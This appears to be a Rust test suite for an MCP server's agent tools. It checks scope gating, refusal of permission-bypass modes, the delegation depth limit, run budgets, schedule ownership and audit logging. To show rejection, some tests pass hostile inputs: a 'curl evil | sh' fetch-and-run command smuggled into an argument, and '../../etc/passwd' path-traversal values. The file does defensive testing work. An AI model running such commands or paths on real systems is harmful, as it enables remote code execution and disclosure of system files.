//! Lucina Agents tools (scope `agents`) against the `/v1/agents` fake in
//! `common::agents`: scope gating, schemas, the permission-answer refusal, the
//! delegation depth, run budgets, schedule ownership and the audit log.

mod common;

use common::agents::{AGENTS_TOKEN, MAIN_CHECKOUT};
use common::*;
use serde_json::{json, Value};

const AGENT_TOOLS: [&str; 29] = [
    "agents_list",
    "agent_run",
    "agent_send",
    "agent_logs",
    "agent_wait",
    "agent_stop",
    "agent_archive",
    "agent_inspect",
    "agents_search",
    "workspaces_list",
    "workspace_create",
    "workspace_diff",
    "files_list",
    "file_read",
    "terminal_list",
    "terminal_read",
    "terminal_send",
    "scripts_list",
    "script_start",
    "script_stop",
    "schedules_list",
    "schedule_add",
    "schedule_remove",
    "permissions_list",
    "agents_usage",
    "catalog_get",
    "catalog_impact",
    "catalog_health",
    "catalog_drift",
];

const WS: &str = "wks_42a3dadd481e4d7f";

fn agent_requests(h: &Harness) -> Vec<Recorded> {
    h.mock
        .state
        .lock()
        .unwrap()
        .log
        .iter()
        .filter(|r| r.path.starts_with("/v1/agents"))
        .cloned()
        .collect()
}

fn run_args() -> Value {
    json!({"prompt": "fix the flaky test", "provider": "claude", "workspace_id": WS, "wait_seconds": 5})
}

#[tokio::test]
async fn agent_tools_need_the_agents_scope() {
    let h = start().await;
    // Every other scope together still gets no agent tool.
    let owner = h.issue("claude-code", "read,chat,write,computer");
    let names = h.tool_names(&owner).await;
    assert!(!names.iter().any(|n| AGENT_TOOLS.contains(&n.as_str())), "{names:?}");
    let (err, text) = h.call(&owner, "agent_run", run_args()).await;
    assert!(err && text.contains("`agents` scope"), "{text}");
    let (err, _) = h.call(&owner, "agents_list", json!({})).await;
    assert!(err);
    assert!(agent_requests(&h).is_empty());
    // The refusals are audited.
    let audit = h.agents_audit();
    assert_eq!(audit.len(), 2);
    assert_eq!(audit[0]["tool"], "agent_run");
    assert_eq!(audit[0]["ok"], false);
    assert_eq!(audit[0]["error"], "scope_denied");
    assert_eq!(audit[0]["caller"], "claude-code");

    let hermes = h.issue("hermes", "read,agents");
    let names = h.tool_names(&hermes).await;
    for t in AGENT_TOOLS {
        assert!(names.contains(&t.to_owned()), "{t} missing");
    }
    // `agents` doesn't bring `write` or `computer` along.
    assert!(!names.contains(&"note_save".to_owned()) && !names.contains(&"computer_bash".to_owned()));
    assert!(names.contains(&"note_get".to_owned()));
}

#[tokio::test]
async fn tool_schemas_offer_no_owner_powers() {
    let h = start().await;
    let t = h.issue("hermes", "read,agents");
    let r = h.rpc(&t, "tools/list", json!({})).await;
    let tools: Vec<&Value> = r["tools"]
        .as_array()
        .unwrap()
        .iter()
        .filter(|t| AGENT_TOOLS.contains(&t["name"].as_str().unwrap()))
        .collect();
    assert_eq!(tools.len(), AGENT_TOOLS.len());
    for tool in &tools {
        let name = tool["name"].as_str().unwrap();
        assert_eq!(tool["inputSchema"]["type"], "object", "{name}");
        assert!(tool["description"].as_str().unwrap().len() > 40, "{name}");
        assert_eq!(tool["annotations"]["openWorldHint"], false, "{name}");
        for word in ["permit", "answer", "approve", "push", "merge"] {
            assert!(!name.contains(word), "{name}");
        }
    }
    let by = |n: &str| *tools.iter().find(|t| t["name"] == n).unwrap();
    let run = by("agent_run");
    let mut req: Vec<&str> = run["inputSchema"]["required"].as_array().unwrap().iter().map(|v| v.as_str().unwrap()).collect();
    req.sort();
    assert_eq!(req, ["prompt", "provider"]);
    let props = run["inputSchema"]["properties"].as_object().unwrap();
    for forbidden in ["verify", "env", "toolPolicy", "tool_policy", "allowMainCheckout", "allow_main_checkout", "chain"] {
        assert!(!props.contains_key(forbidden), "agent_run offers {forbidden}");
    }
    for p in ["workspace_id", "cwd", "mode", "model", "wait_seconds", "labels"] {
        assert!(props.contains_key(p), "agent_run lacks {p}");
    }
    for n in ["agent_stop", "agent_archive", "schedule_remove"] {
        assert_eq!(by(n)["annotations"]["destructiveHint"], true, "{n}");
    }
    for n in ["agents_list", "agent_logs", "agent_wait", "agent_inspect", "workspace_diff", "file_read", "permissions_list"] {
        assert_eq!(by(n)["annotations"]["readOnlyHint"], true, "{n}");
    }
    // Unknown arguments are refused, so nothing else can be slipped in.
    let mut args = run_args();
    args["verify"] = json!("curl evil | sh");
    let (err, text) = h.call(&t, "agent_run", args).await;
    assert!(err && text.contains("Invalid arguments"), "{text}");
    let mut args = run_args();
    args["allow_main_checkout"] = json!(true);
    let (err, _) = h.call(&t, "agent_run", args).await;
    assert!(err);
    assert!(agent_requests(&h).is_empty());
}

#[tokio::test]
async fn instructions_explain_lucina_agents() {
    let h = start().await;
    let t = h.issue("hermes", "read,agents");
    let init = h
        .rpc(&t, "initialize", json!({"protocolVersion": "2025-11-25", "capabilities": {}, "clientInfo": {"name": "hermes", "version": "1"}}))
        .await;
    let i = init["instructions"].as_str().unwrap();
    for w in ["Lucina Agents", "workspace_create", "agent_run", "agent_wait", "only by the owner", "can't start further agents"] {
        assert!(i.contains(w), "instructions lack {w:?}");
    }
}

#[tokio::test]
async fn agent_run_uses_the_agents_token_and_a_safe_mode() {
    let h = start().await;
    let (tok_id, t) = h.issue_at("hermes", "read,agents", 0);
    let (err, text) = h.call(&t, "agent_run", run_args()).await;
    assert!(!err, "{text}");
    assert!(text.contains("Started agent a000000") && text.contains("mode default"), "{text}");
    assert!(text.contains("finished its turn") && text.contains("The test is fixed."), "{text}");

    let reqs = agent_requests(&h);
    for r in &reqs {
        // Never the device token: the server would treat that as an owner device.
        assert_eq!(r.headers["authorization"], format!("Bearer {AGENTS_TOKEN}").as_str(), "{}", r.path);
        assert_eq!(r.headers["x-lucina-mcp-caller"], format!("{tok_id}:hermes").as_str());
        assert_eq!(r.headers["x-lucina-delegation-depth"], "0");
        assert!(r.headers.get("x-lucina-origin").is_none());
    }
    let create = reqs.iter().find(|r| r.method == "POST" && r.path == "/v1/agents").unwrap();
    let b = &create.body;
    assert_eq!(b["provider"], "claude");
    assert_eq!(b["workspaceId"], WS);
    assert_eq!(b["modeId"], "default");
    assert_eq!(b["labels"]["lucina.mcp-token"], tok_id.as_str());
    assert_eq!(b["labels"]["lucina.delegation-depth"], "1");
    assert_eq!(b["labels"]["lucina.origin"], "mcp:hermes");
    assert!(b["idempotencyKey"].is_string());
    for k in ["verify", "env", "toolPolicy", "allowMainCheckout", "autoFix", "chain"] {
        assert!(b.get(k).is_none(), "create body carries {k}");
    }
    assert!(reqs.iter().any(|r| r.path.ends_with("/wait")));

    let audit = h.agents_audit();
    let last = audit.last().unwrap();
    assert_eq!(last["tool"], "agent_run");
    assert_eq!(last["ok"], true);
    assert_eq!(last["tokenId"], tok_id.as_str());
    assert!(last["target"].as_str().unwrap().starts_with("a000000"));
    assert_eq!(last["promptChars"], 18);
    assert!(!audit.iter().any(|l| l.to_string().contains("flaky")));

    // It shows up as this connection's agent.
    let (_, list) = h.call(&t, "agents_list", json!({"mine": true})).await;
    assert!(list.contains("started by hermes (MCP)"), "{list}");
}

#[tokio::test]
async fn agent_run_refuses_modes_and_providers_without_permission_prompts() {
    let h = start().await;
    let t = h.issue("hermes", "read,agents");
    let mut args = run_args();
    args["mode"] = json!("bypassPermissions");
    let (err, text) = h.call(&t, "agent_run", args).await;
    assert!(err && text.contains("skips permission prompts"), "{text}");
    let mut args = run_args();
    args["provider"] = json!("codex");
    args["mode"] = json!("full-access");
    let (err, _) = h.call(&t, "agent_run", args).await;
    assert!(err);
    let mut args = run_args();
    args["provider"] = json!("zcode");
    let (err, text) = h.call(&t, "agent_run", args).await;
    assert!(err && text.contains("without permission prompts"), "{text}");
    let mut args = run_args();
    args["provider"] = json!("nope");
    let (err, text) = h.call(&t, "agent_run", args).await;
    assert!(err && text.contains("Available: claude, codex, opencode."), "{text}");
    assert!(!agent_requests(&h).iter().any(|r| r.method == "POST"));
    // A main checkout is refused by the worktree guard, with a way forward.
    let (err, text) = h
        .call(&t, "agent_run", json!({"prompt": "x", "provider": "claude", "cwd": MAIN_CHECKOUT}))
        .await;
    assert!(err && text.contains("workspace_create"), "{text}");
}

#[tokio::test]
async fn permission_requests_are_read_only() {
    let h = start().await;
    let t = h.issue("hermes", "read,agents");
    let (err, text) = h.call(&t, "permissions_list", json!({})).await;
    assert!(!err && text.contains("perm-1") && text.contains("Only the owner"), "{text}");
    h.mock.state.lock().unwrap().agents.push(common::agents::snapshot("aperm000-bacb", "running", &json!({}), "/w"));
    let (err, text) = h.call(&t, "agent_wait", json!({"agent_id": "aperm000", "wait_seconds": 1})).await;
    assert!(!err && text.contains("waiting for a permission answer") && text.contains("Only the owner"), "{text}");
    let (_, text) = h.call(&t, "agent_inspect", json!({"agent_id": "aperm000"})).await;
    assert!(text.contains("pending permissions") && text.contains("perm-1"), "{text}");
    // There is no tool to answer one, and nothing ever posted an answer.
    for name in ["agent_permit", "permission_answer", "permission_respond"] {
        let (status, _, v) = h
            .rpc_raw(Some(&t), "tools/call", json!({"name": name, "arguments": {"id": "perm-1", "behavior": "allow"}}))
            .await;
        assert_eq!(status, 200);
        assert!(v["error"].is_object(), "{name}: {v}");
    }
    assert!(!agent_requests(&h).iter().any(|r| r.method == "POST" && r.path.contains("/permissions")));
}

#[tokio::test]
async fn delegated_callers_cannot_start_agents() {
    let h = start().await;
    let (_, run_token) = h.issue_at("hermes-run", "read,agents", 1);
    let (err, text) = h.call(&run_token, "agent_run", run_args()).await;
    assert!(err && text.contains("depth is limited to 1"), "{text}");
    let (err, text) = h
        .call(&run_token, "schedule_add", json!({"cron": "0 7 * * *", "provider": "claude", "prompt": "x"}))
        .await;
    assert!(err && text.contains("depth"), "{text}");
    assert!(!agent_requests(&h).iter().any(|r| r.method == "POST"));
    // It can still read and steer what exists.
    let (err, _) = h.call(&run_token, "agents_list", json!({})).await;
    assert!(!err);
    let audit = h.agents_audit();
    assert!(audit.iter().any(|l| l["tool"] == "agent_run" && l["ok"] == false && l["depth"] == 1));
    // Every request said which depth it came from.
    assert!(agent_requests(&h).iter().all(|r| r.headers["x-lucina-delegation-depth"] == "1"));
}

#[tokio::test]
async fn run_budgets_per_token() {
    let h = start_with(|cfg, _| {
        cfg.agents_runs_per_hour = 1;
        cfg.agents_max_running = 5;
    })
    .await;
    let t = h.issue("hermes", "read,agents");
    let mut args = run_args();
    args["wait_seconds"] = json!(0);
    let (err, text) = h.call(&t, "agent_run", args.clone()).await;
    assert!(!err && text.contains("agent_wait"), "{text}");
    let (err, text) = h.call(&t, "agent_run", args.clone()).await;
    assert!(err && text.contains("in the last hour"), "{text}");
    // Another token has its own budget.
    let other = h.issue("grok", "read,agents");
    let (err, _) = h.call(&other, "agent_run", args.clone()).await;
    assert!(!err);

    let h = start_with(|cfg, _| cfg.agents_max_running = 1).await;
    let t = h.issue("hermes", "read,agents");
    let (err, _) = h.call(&t, "agent_run", args.clone()).await;
    assert!(!err);
    // The first one is still running.
    let (err, text) = h.call(&t, "agent_run", args).await;
    assert!(err && text.contains("already has 1 agents running"), "{text}");
}

#[tokio::test]
async fn follow_up_logs_stop_archive_and_workspaces() {
    let h = start().await;
    let t = h.issue("hermes", "read,agents");
    let mut args = run_args();
    args["wait_seconds"] = json!(0);
    h.call(&t, "agent_run", args).await;
    let id = "a0000001";
    let (err, text) = h.call(&t, "agent_send", json!({"agent_id": id, "prompt": "also add a test", "steer": true})).await;
    assert!(!err && text.contains("Added to its running turn"), "{text}");
    let send = agent_requests(&h).into_iter().find(|r| r.path.ends_with("/send")).unwrap();
    assert_eq!(send.body["activeTurnBehavior"], "steer");
    let (_, logs) = h.call(&t, "agent_logs", json!({"agent_id": id})).await;
    assert!(logs.contains("[User] fix the flaky test") && logs.contains("## Cycle 1"), "{logs}");
    let (_, text) = h.call(&t, "agent_stop", json!({"agent_id": id})).await;
    assert!(text.starts_with("Stopped agent a0000001-"), "{text}");
    let (_, text) = h.call(&t, "agent_archive", json!({"agent_id": id})).await;
    assert!(text.contains("Archived"), "{text}");
    let (_, text) = h.call(&t, "agents_search", json!({"q": "flaky"})).await;
    assert!(text.contains("1 match"), "{text}");
    let (err, text) = h.call(&t, "agent_inspect", json!({"agent_id": "zzz"})).await;
    assert!(err && text.contains("agents_list"), "{text}");

    let (_, text) = h.call(&t, "workspaces_list", json!({})).await;
    assert!(text.contains(WS) && text.contains("branch fix-it from main"), "{text}");
    let (err, text) = h
        .call(&t, "workspace_create", json!({"repo_path": MAIN_CHECKOUT, "branch": "fix-it", "prompt": "fix the flaky test"}))
        .await;
    assert!(!err && text.contains(&format!("workspace_id \"{WS}\"")), "{text}");
    let create = agent_requests(&h).into_iter().find(|r| r.path == "/v1/agents/workspaces" && r.method == "POST").unwrap();
    assert_eq!(create.body["isolation"], "worktree");
    assert_eq!(create.body["worktreeSlug"], "fix-it");
    let (_, text) = h.call(&t, "workspace_diff", json!({"workspace_id": WS})).await;
    assert!(text.contains("### src/a.txt +1 -0") && text.contains("+changed"), "{text}");
    let (_, text) = h.call(&t, "files_list", json!({"workspace_id": WS})).await;
    assert!(text.contains("- src/") && text.contains("- main.rs (13 B)"), "{text}");
    let (_, text) = h.call(&t, "file_read", json!({"workspace_id": WS, "path": "src/a.txt"})).await;
    assert!(text.ends_with("hello\nchanged\n"), "{text}");
    let (err, _) = h.call(&t, "file_read", json!({"workspace_id": WS, "path": "../../etc/passwd"})).await;
    assert!(err);
    let (_, text) = h.call(&t, "agents_usage", json!({})).await;
    assert!(text.contains("- claude: 1 agent(s)") && text.contains("zcode (not from the MCP)"), "{text}");
    // Nothing the owner alone may do was asked for.
    for r in agent_requests(&h) {
        assert!(!r.path.ends_with("/archive") || !r.path.contains("/workspaces/"), "{}", r.path);
        assert!(!r.path.ends_with("/push") && !r.path.ends_with("/pr") && r.method != "DELETE", "{}", r.path);
    }
}

#[tokio::test]
async fn terminals_and_scripts() {
    let h = start().await;
    let t = h.issue("hermes", "read,agents");
    let (err, text) = h.call(&t, "terminal_list", json!({"workspace_id": WS})).await;
    assert!(!err && text.contains("term_9f1c2a7b3d4e5f60 · dev · running") && text.contains("script dev") && text.contains("listening on 4173"), "{text}");
    let (err, text) = h.call(&t, "terminal_read", json!({"terminal_id": "term_9f1c2a7b3d4e5f60", "lines": 50})).await;
    assert!(!err && text.contains("ready in 412 ms") && text.ends_with("http://127.0.0.1:4173/"), "{text}");
    let (err, text) = h.call(&t, "terminal_send", json!({"terminal_id": "term_9f1c2a7b3d4e5f60", "keys": "C-c"})).await;
    assert!(!err && text.contains("Typed 1 character"), "{text}");
    let (err, text) = h.call(&t, "terminal_read", json!({"terminal_id": "term_other"})).await;
    assert!(err && text.contains("No terminal found"), "{text}");
    let (err, text) = h.call(&t, "terminal_send", json!({"terminal_id": "../x", "keys": "y"})).await;
    assert!(err && text.contains("terminal id"), "{text}");
    let (err, text) = h.call(&t, "scripts_list", json!({"workspace_id": WS})).await;
    assert!(!err && text.contains("- dev · service · running · port 4173 · healthy") && text.contains("- lint · script · stopped"), "{text}");
    let (err, text) = h.call(&t, "scripts_list", json!({})).await;
    assert!(err && text.contains("workspace_id"), "{text}");
    let (err, text) = h.call(&t, "script_start", json!({"workspace_id": WS, "script": "lint"})).await;
    assert!(!err && text.starts_with("Started lint"), "{text}");
    let (err, text) = h.call(&t, "script_stop", json!({"workspace_id": WS, "script": "dev"})).await;
    assert!(!err && text.starts_with("Stopped dev") && text.contains("stopped"), "{text}");
    let (err, text) = h.call(&t, "script_start", json!({"workspace_id": "wks_ownersonly", "script": "dev"})).await;
    assert!(err && text.contains("not yours"), "{text}");
    let reqs = agent_requests(&h);
    let send = reqs.iter().find(|r| r.path.ends_with("/input")).expect("input");
    assert_eq!(send.body, json!({"keys": "C-c", "literal": false}));
    assert!(reqs.iter().any(|r| r.path == "/v1/agents/terminals/term_9f1c2a7b3d4e5f60/capture" && r.query.contains("start=-50")));
    assert!(reqs.iter().any(|r| r.path == "/v1/agents/terminals" && r.query.contains(WS)));
    assert!(reqs.iter().any(|r| r.method == "POST" && r.path == format!("/v1/agents/workspaces/{WS}/scripts/dev/stop")));
    // Nothing that kills a terminal or opens a service.
    assert!(reqs.iter().all(|r| r.method != "DELETE" && !r.path.contains("/services/")));
}

#[tokio::test]
async fn later_phases_say_not_available_yet() {
    let h = start().await;
    let t = h.issue("hermes", "read,agents");
    for (tool, args) in [
        ("schedules_list", json!({})),
        ("schedule_add", json!({"cron": "0 7 * * 1-5", "provider": "claude", "prompt": "x", "workspace_id": WS})),
        ("schedule_remove", json!({"schedule_id": "sch_1"})),
    ] {
        let (err, text) = h.call(&t, tool, args).await;
        assert!(err && text.contains("phase 6") && text.contains("not available yet"), "{tool}: {text}");
    }
}

#[tokio::test]
async fn schedules_change_only_when_created_here() {
    let h = start().await;
    let (tok_id, t) = h.issue_at("hermes", "read,agents", 0);
    // agentd's schedule shape (lucina-agents `schedule::Schedule`).
    let sched = |id: &str, cron: &str, provider: &str, name: &str, labels: Value| {
        json!({"id": id, "name": name, "prompt": "p", "cadence": {"type": "cron", "expression": cron, "timezone": "Europe/Rome"},
               "target": {"type": "new-agent", "config": {"provider": provider, "cwd": "/w"}}, "status": "active",
               "nextRunAt": "2026-10-29T06:00:00.000Z", "labels": labels, "createdBy": "local", "runs": []})
    };
    h.mock.state.lock().unwrap().schedules = Some(vec![
        sched("sch_owner", "0 7 * * *", "claude", "owner's", json!({})),
        sched("sch_other", "0 8 * * *", "codex", "grok's", json!({"lucina.mcp-token": "tok_other"})),
        sched("sch_mine", "0 9 * * *", "claude", "mine", json!({"lucina.mcp-token": tok_id})),
        json!({"id": "sch_hb", "name": null, "prompt": "check the PR", "cadence": {"type": "every", "everyMs": 300000},
               "target": {"type": "agent", "agentId": "a1"}, "status": "paused", "nextRunAt": null, "labels": {}, "createdBy": "agent:a1", "runs": []}),
    ]);
    let (_, list) = h.call(&t, "schedules_list", json!({})).await;
    assert!(list.contains("sch_mine") && list.matches("(yours)").count() == 1, "{list}");
    assert!(list.contains("- sch_mine · 0 9 * * * (Europe/Rome) · claude · active · next 2026-10-29T06:00:00.000Z · mine (yours)"), "{list}");
    assert!(list.contains("- sch_hb · every 5 min · heartbeat · paused · next - · check the PR"), "{list}");
    for id in ["sch_owner", "sch_other"] {
        let (err, text) = h.call(&t, "schedule_remove", json!({"schedule_id": id})).await;
        assert!(err && text.contains("not created by this connection"), "{text}");
    }
    let (err, text) = h.call(&t, "schedule_remove", json!({"schedule_id": "sch_mine"})).await;
    assert!(!err, "{text}");
    let deletes: Vec<String> = agent_requests(&h).into_iter().filter(|r| r.method == "DELETE").map(|r| r.path).collect();
    assert_eq!(deletes, ["/v1/agents/schedules/sch_mine"]);
    let (err, _) = h
        .call(&t, "schedule_add", json!({"cron": "0 7 * * 1-5", "provider": "claude", "prompt": "daily check", "workspace_id": WS}))
        .await;
    assert!(!err);
    let add = agent_requests(&h).into_iter().find(|r| r.method == "POST" && r.path == "/v1/agents/schedules").unwrap();
    assert_eq!(add.body["labels"]["lucina.mcp-token"], tok_id.as_str());
    assert_eq!(add.body["modeId"], "default", "an unattended run keeps permission prompts");
    // A provider without permission prompts can't be scheduled from the MCP.
    let (err, text) = h.call(&t, "schedule_add", json!({"cron": "0 7 * * *", "provider": "zcode", "prompt": "x", "workspace_id": WS})).await;
    assert!(err, "{text}");
}

#[tokio::test]
async fn search_uses_agentd_when_it_has_it() {
    let h = start().await;
    let t = h.issue("hermes", "read,agents");
    h.mock.state.lock().unwrap().search = Some(json!({"query": "websocket", "results": [
        {"agentId": "a0000001-aaaa", "title": "Fix the scroll anchor", "provider": "claude", "status": "idle",
         "matches": [{"field": "timeline", "seq": 3, "kind": "assistant_message", "snippet": "the [websocket] reconnect\nloop"}]}]}));
    let (err, text) = h.call(&t, "agents_search", json!({"q": "websocket"})).await;
    assert!(!err, "{text}");
    assert!(text.contains("- a0000001 Fix the scroll anchor · claude · idle") && text.contains("    timeline: the [websocket] reconnect loop"), "{text}");
    let req = agent_requests(&h).into_iter().find(|r| r.path == "/v1/agents/search").unwrap();
    assert!(req.query.contains("q=websocket"), "{}", req.query);
}

#[tokio::test]
async fn without_the_agents_token_the_tools_say_so() {
    let h = start_with(|cfg, _| cfg.agents_token = None).await;
    let t = h.issue("hermes", "read,agents");
    let (err, text) = h.call(&t, "agents_list", json!({})).await;
    assert!(err && text.contains("isn't connected"), "{text}");
    assert!(agent_requests(&h).is_empty());
}

#[tokio::test]
async fn catalog_tools_read_the_service_map() {
    let h = start().await;
    let t = h.issue("claude-code", "read,agents");
    let (err, text) = h.call(&t, "catalog_get", json!({"id": "pokoin-db-writer"})).await;
    assert!(!err, "{text}");
    assert!(text.contains("pokoin-db-writer (Pokoin Postgres writer (nezopt)) — Pokoin / pokoin, db on nezopt"), "{text}");
    assert!(text.contains("State: down") && text.contains("Needed by: k3s-pokoin-api (hard), pokoin-db-replica (soft)"), "{text}");
    assert!(text.contains("Restart: docker restart pokoin-marketplace-postgres-15t"), "{text}");

    let (err, text) = h.call(&t, "catalog_impact", json!({"ids": ["pokoin-db-writer"]})).await;
    assert!(!err, "{text}");
    assert!(text.starts_with("If pokoin-db-writer went down: 1 break, 1 degrade."), "{text}");
    assert!(text.contains("- site-api (critical), serves api.pokoin.com via cloudflared-pi ← pokoin-db-writer"), "{text}");

    let (err, text) = h.call(&t, "catalog_health", json!({})).await;
    assert!(!err, "{text}");
    assert!(text.contains("- down pokoin-db-writer (critical)") && text.contains("- broken k3s-pokoin-api (high), because of pokoin-db-writer"), "{text}");
    let (err, text) = h.call(&t, "catalog_health", json!({"id": "pokoin-db-writer", "live": true})).await;
    assert!(!err && text.starts_with("pokoin-db-writer: ok"), "{text}");
    let (err, text) = h.call(&t, "catalog_health", json!({"live": true})).await;
    assert!(err && text.contains("live needs an id"), "{text}");

    let (err, text) = h.call(&t, "catalog_drift", json!({})).await;
    assert!(!err && text.contains("- unknown unit on nezopt: user:new-thing.service"), "{text}");

    // Ids are checked before anything is sent; the paths go to agentd's top-level /catalog.
    let (err, _) = h.call(&t, "catalog_get", json!({"id": "../etc/passwd"})).await;
    assert!(err);
    let paths: Vec<String> = agent_requests(&h).into_iter().map(|r| r.path).collect();
    assert_eq!(
        paths,
        [
            "/v1/agents/catalog/components/pokoin-db-writer",
            "/v1/agents/catalog/impact/pokoin-db-writer",
            "/v1/agents/catalog/status",
            "/v1/agents/catalog/health",
            "/v1/agents/catalog/drift",
        ]
    );
}
